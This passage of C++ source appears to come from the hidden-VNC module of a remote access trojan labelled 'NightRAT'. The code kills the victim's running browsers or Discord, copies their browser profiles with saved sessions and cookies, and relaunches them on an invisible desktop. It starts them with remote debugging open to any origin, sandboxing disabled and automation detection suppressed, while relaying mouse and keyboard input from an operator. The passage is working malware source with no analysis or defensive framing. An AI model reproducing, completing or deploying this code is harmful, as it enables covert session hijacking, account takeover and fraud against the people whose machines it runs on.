            g_frameCV.notify_all();
            g_sendCV.notify_all();
            g_inputCV.notify_all();
            if (g_captureThread.joinable()) g_captureThread.join();
            if (g_encodeThread.joinable())  g_encodeThread.join();
            if (g_sendThread.joinable())    g_sendThread.join();
            if (g_inputThread.joinable())   g_inputThread.join();
            release_all_bitmap_slots();
            g_dragging = false;
            g_dragHwnd = NULL;
            g_mouseDownTarget[0] = NULL;
            g_mouseDownTarget[1] = NULL;
            g_mouseDownTarget[2] = NULL;
            g_staticFrameCount = 0;
            g_forceFullFrame = false;
            g_lastInteractiveFullFrameTick = 0;
            {
                lock_guard<mutex> lock(g_inputMutex);
                g_inputQueue.clear();
            }
        } else if (action == "hvnc_quality") {
            lock_guard<mutex> lock(g_captureMutex);
            g_scalePercent = cmd.value("quality", 50);
            if (g_scalePercent < 10) g_scalePercent = 10;
            if (g_scalePercent > 100) g_scalePercent = 100;
            g_staticFrameCount = 0;
            request_full_frame(true);
        } else if (action == "hvnc_run") {
            string requestedPath = cmd.value("path", "cmd.exe");
            wstring wRequestedPath = utf8_to_wstring(requestedPath);
            bool copyProfile = cmd.value("copy_profile", false);
            bool closeReal = cmd.value("close_real", false);

            bool isBrowser = (wRequestedPath == L"Google Chrome" ||
                              wRequestedPath == L"Microsoft Edge" ||
                              wRequestedPath == L"Firefox" ||
                              wRequestedPath == L"Waterfox" ||
                              wRequestedPath == L"LibreWolf" ||
                              wRequestedPath == L"Opera" ||
                              wRequestedPath == L"Opera GX" ||
                              wRequestedPath == L"Brave" ||
                              wRequestedPath == L"Discord");

            bool isGecko = (wRequestedPath == L"Firefox" ||
                            wRequestedPath == L"Waterfox" ||
                            wRequestedPath == L"LibreWolf");

            if (isBrowser) {
                thread([wRequestedPath, copyProfile, isGecko, closeReal]() {
                    ensure_desktop();
                    if (!g_hHiddenDesktop) return;

                    wstring exeName;
                    if (wRequestedPath == L"Google Chrome") exeName = L"chrome.exe";
                    else if (wRequestedPath == L"Microsoft Edge") exeName = L"msedge.exe";
                    else if (wRequestedPath == L"Firefox") exeName = L"firefox.exe";
                    else if (wRequestedPath == L"Waterfox") exeName = L"waterfox.exe";
                    else if (wRequestedPath == L"LibreWolf") exeName = L"librewolf.exe";
                    else if (wRequestedPath == L"Opera") exeName = L"opera.exe";
                    else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                    else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                    else if (wRequestedPath == L"Discord") exeName = L"discord.exe";

                    if (closeReal && !exeName.empty()) {
                        send_status("Mevcut uygulama kapatılıyor...");
                        kill_process_by_name(exeName);
                        if (wRequestedPath == L"Discord") {
                            kill_process_by_name(L"Update.exe");
                        }
                        Sleep(800);
                    }

                    wstring exePath;
                    if (wRequestedPath == L"Discord") {
                        wchar_t localApp[MAX_PATH] = {0};
                        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
                        fs::path discDir(wstring(localApp) + L"\\Discord");
                        if (fs::exists(discDir)) {
                            wstring bestAppDir;
                            for (const auto& entry : fs::directory_iterator(discDir)) {
                                if (entry.is_directory()) {
                                    wstring name = entry.path().filename().wstring();
                                    if (name.rfind(L"app-", 0) == 0) {
                                        if (bestAppDir.empty() || name > bestAppDir) {
                                            bestAppDir = name;
                                        }
                                    }
                                }
                            }
                            if (!bestAppDir.empty()) {
                                exePath = discDir.wstring() + L"\\" + bestAppDir + L"\\Discord.exe";
                            }
                        }
                        if (exePath.empty() || !fs::exists(exePath)) {
                            exePath = wstring(localApp) + L"\\Discord\\Update.exe";
                        }
                    } else if (wRequestedPath == L"Opera") {
                        wchar_t localApp[MAX_PATH] = {0};
                        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
                        exePath = wstring(localApp) + L"\\Programs\\Opera\\launcher.exe";
                        if (!fs::exists(exePath)) exePath = wstring(localApp) + L"\\Programs\\Opera\\opera.exe";
                        if (!fs::exists(exePath)) exePath = L"C:\\Program Files\\Opera\\launcher.exe";
                        if (!fs::exists(exePath)) exePath = L"C:\\Program Files\\Opera\\opera.exe";
                        if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Opera\\launcher.exe";
                        if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Opera\\opera.exe";
                    } else if (wRequestedPath == L"Opera GX") {
                        wchar_t localApp[MAX_PATH] = {0};
                        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
                        exePath = wstring(localApp) + L"\\Programs\\Opera GX\\launcher.exe";
                        if (!fs::exists(exePath)) exePath = wstring(localApp) + L"\\Programs\\Opera GX\\opera.exe";
                        if (!fs::exists(exePath)) exePath = L"C:\\Program Files\\Opera GX\\launcher.exe";
                        if (!fs::exists(exePath)) exePath = L"C:\\Program Files\\Opera GX\\opera.exe";
                        if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Opera GX\\launcher.exe";
                        if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Opera GX\\opera.exe";
                    } else if (wRequestedPath == L"Brave") {
                        exePath = L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
                        if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
                        if (!fs::exists(exePath)) {
                            wchar_t localApp[MAX_PATH] = {0};
                            SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
                            exePath = wstring(localApp) + L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
                        }
                    } else {
                        exePath = get_app_path(exeName);
                        if (exePath.empty()) {
                            if (wRequestedPath == L"Firefox") {
                                exePath = L"C:\\Program Files\\Mozilla Firefox\\firefox.exe";
                                if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe";
                            } else if (wRequestedPath == L"Waterfox") {
                                exePath = L"C:\\Program Files\\Waterfox\\waterfox.exe";
                            } else if (wRequestedPath == L"LibreWolf") {
                                exePath = L"C:\\Program Files\\LibreWolf\\librewolf.exe";
                            }
                        }
                    }

                    if (exePath.empty() || !fs::exists(exePath)) {
                        send_error("Application executable not found.");
                        return;
                    }

                    wstring profilePath;
                    wstring profileDir = L"Default";

                    if (copyProfile) {
                        wstring sourceUserData;
                        if (isGecko) {
                            sourceUserData = get_gecko_profile_path(wRequestedPath);
                        } else {
                            sourceUserData = get_browser_profile_path(wRequestedPath);
                        }

                        if (sourceUserData.empty() || !fs::exists(sourceUserData)) {
                            send_error("User Data directory not found.");
                            return;
                        }

                        wchar_t tempPath[MAX_PATH];
                        GetTempPathW(MAX_PATH, tempPath);
                        wstring tempProfileRoot = tempPath;
                        tempProfileRoot += L"NightRAT_";
                        if (wRequestedPath == L"Opera GX") {
                            tempProfileRoot += L"operagx";
                        } else {
                            tempProfileRoot += exeName;
                        }
                        tempProfileRoot += L"_Profile";

                        // Mevcut kopya varsa temizle
                        try {
                            if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
                        } catch (...) {}

                        if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
                            send_error("Failed to copy browser profile.");
                            return;
                        }

                        if (isGecko) {
                            wstring profilesPath = sourceUserData + L"\\Profiles";
                            wstring profileSubDir;
                            WIN32_FIND_DATAW findData;
                            HANDLE hFind = FindFirstFileW((profilesPath + L"\\*").c_str(), &findData);
                            if (hFind != INVALID_HANDLE_VALUE) {
                                do {
                                    wstring name = findData.cFileName;
                                    if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                                        name != L"." && name != L"..") {
                                        profileSubDir = name;
                                        break;
                                    }
                                } while (FindNextFileW(hFind, &findData));
                                FindClose(hFind);
                            }

                            if (!profileSubDir.empty()) {
                                profilePath = tempProfileRoot + L"\\Profiles\\" + profileSubDir;
                            } else {
                                profilePath = tempProfileRoot;
                            }
                        } else {
                            WIN32_FIND_DATAW findData;
                            HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
                            if (hFind != INVALID_HANDLE_VALUE) {
                                do {
                                    wstring name = findData.cFileName;
                                    if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                                        (name == L"Default" || name.find(L"Profile ") == 0)) {
                                        profileDir = name;
                                        break;
                                    }
                                } while (FindNextFileW(hFind, &findData));
                                FindClose(hFind);
                            }
                            profilePath = tempProfileRoot;
                        }
                    }

                    send_status("Tarayıcı başlatılıyor...");

                    wstring args;
                    if (isGecko) {
                        args = L" -no-remote";
                        if (copyProfile) {
                            args += L" -profile \"" + profilePath + L"\"";
                        }
                    } else {
                        args = L" --remote-debugging-port=9222";
                        if (copyProfile) {
                            args += L" --user-data-dir=\"" + profilePath + L"\"";
                            args += L" --profile-directory=\"" + profileDir + L"\"";
                        }
                        args += L" --no-sandbox"
                                L" --disable-gpu"
                                L" --window-size=1280,720"
                                L" --window-position=0,0"
                                L" --no-first-run"
                                L" --no-default-browser-check"
                                L" --disable-background-networking"
                                L" --disable-sync"
                                L" --disable-translate"
                                L" --metrics-recording-only"
                                L" --safebrowsing-disable-auto-update"
                                L" --disable-setuid-sandbox"
                                L" --disable-infobars"
                                L" --disable-gpu-compositing"
                                L" --force-cpu-draw"
                                L" --disable-encryption-win"
                                L" --restore-last-session"
                                L" --no-pings"
                                L" --disable-notifications"
                                L" --disable-component-update"
                                L" --disable-blink-features=AutomationControlled"
                                L" --disable-backgrounding-occluded-windows"
                                L" --disable-renderer-backgrounding"
                                L" --remote-allow-origins=*"
                                L" --lang=en-US";
                    }

                    wstring fullCmd = L"\"" + exePath + L"\"" + args;
                    vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
                    cmdLine.push_back(L'\0');

                    wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
                    STARTUPINFOW si = { sizeof(si) };
                    si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
                    si.dwFlags      = STARTF_USESHOWWINDOW;
                    si.wShowWindow  = SW_SHOWNORMAL;

                    PROCESS_INFORMATION pi = { 0 };

                    HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
                    if (g_hHiddenDesktop) {
                        SetThreadDesktop(g_hHiddenDesktop);
                    }

                    if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                       0, NULL, NULL, &si, &pi)) {
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                        request_full_frame(true);
                        send_status("Browser started on hidden desktop");
                    } else {
                        send_error("Failed to start browser. Error: " + to_string(GetLastError()));
                    }

                    if (hCurrentDesktop) {
                        SetThreadDesktop(hCurrentDesktop);
                    }
                }).detach();
            } else {
                thread([wRequestedPath]() {
                    ensure_desktop();
                    if (!g_hHiddenDesktop) return;

                    HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
                    if (g_hHiddenDesktop) {
                        SetThreadDesktop(g_hHiddenDesktop);
                    }

                    vector<wchar_t> cmdLine(wRequestedPath.begin(), wRequestedPath.end());
                    cmdLine.push_back(L'\0');

                    wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
                    STARTUPINFOW si = { sizeof(si) };
                    si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
                    si.dwFlags      = STARTF_USESHOWWINDOW;
                    si.wShowWindow  = SW_SHOW;

                    PROCESS_INFORMATION pi = { 0 };
                    if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                       CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                        request_full_frame(true);
                        send_status("Process started on hidden desktop");
                    } else {
                        send_error("Failed to start process. Error: " + to_string(GetLastError()));
                    }

                    if (hCurrentDesktop) {
                        SetThreadDesktop(hCurrentDesktop);
                    }
                }).detach();
            }
        } else if (action.find("hvnc_mouse") != string::npos ||
                   action.find("hvnc_key")   != string::npos ||
                   action == "hvnc_char" ||
                   action == "hvnc_doubleclick") {
            lock_guard<mutex> lock(g_inputMutex);
            if (action == "hvnc_mousemove") {
                while (!g_inputQueue.empty() && g_inputQueue.back().action == "hvnc_mousemove") {
                    g_inputQueue.pop_back();
                }
            }
            while (g_inputQueue.size() > 128) {
                g_inputQueue.pop_front();
            }
            g_inputQueue.push_back({action, cmd});
            g_inputCV.notify_one();
        }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning = false;
        g_encodeRunning  = false;
        g_sendRunning    = false;
        g_inputRunning   = false;
        g_frameCV.notify_all();
        g_sendCV.notify_all();
        g_inputCV.notify_all();
    }
    return TRUE;
}